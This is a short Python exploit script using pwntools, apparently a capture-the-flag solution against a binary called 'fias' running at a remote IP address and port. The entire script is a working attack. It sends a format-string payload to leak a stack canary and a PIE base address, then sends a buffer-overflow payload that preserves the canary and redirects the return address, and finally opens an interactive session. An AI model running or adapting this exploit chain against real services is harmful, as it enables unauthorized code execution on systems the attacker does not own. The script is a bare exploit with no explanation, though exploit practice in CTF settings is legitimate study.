from pwn import *
context.terminal=  ['gnome-terminal','-x','sh','-c']
#io = process("./fiap")
#gdb.attach(io)
io  = remote("95.216.233.106",49276)
elf = ELF("./fias")
io.recvuntil("What's your name?\n")
payload = "%3$p.%11$p"
io.sendline(payload)
io.recvuntil("Thank you, ")
pie = int(io.recvuntil(".")[:-1],16) - 134
canary = int(io.recvuntil("00"),16)
io.recvline()
log.info("canary leak: " + hex(canary))
log.info("pie leak: " + hex(pie))
payload = "A" * 25 + p32(canary) + "A" * 12 + p32(pie)
io.sendline(payload)
io.interactive()
